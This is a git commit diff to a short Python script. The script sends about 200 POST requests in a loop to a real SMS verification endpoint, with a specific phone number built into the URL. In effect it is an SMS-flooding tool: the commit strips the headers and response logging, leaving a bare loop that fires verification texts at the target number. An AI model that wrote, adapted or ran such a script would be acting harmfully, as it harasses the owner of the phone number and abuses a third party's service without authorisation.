56feab2ce264a757c16b2603972bafc502d94da7
alireza Programmer <74681914+alirezaprogrammermaker@users.noreply.github.com>
2021-07-25 00:52:02 +0430

    Update file.py

--- file.py
+++ file.py
@@ -3,16 +3,10 @@ import requests
 url = "https://khafan.myket.ir/api/v1/khafan/send-verification/09014274059"
 
 payload = "------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"i\"\r\n\r\ntest\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--"
-headers = {
-    'content-type': "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW",
-    'cache-control': "no-cache",
-    'postman-token': "06c46068-fbcd-61d6-ad7f-6399b65001a3"
-    }
+headers = {}
 i = 1
 while i < 200:
+  requests.request("POST", url, data=payload, headers=headers)
   print(i)
-  response = requests.request("POST", url, data=payload, headers=headers)
-  print(response.text)
+ 
   i += 1
-
-
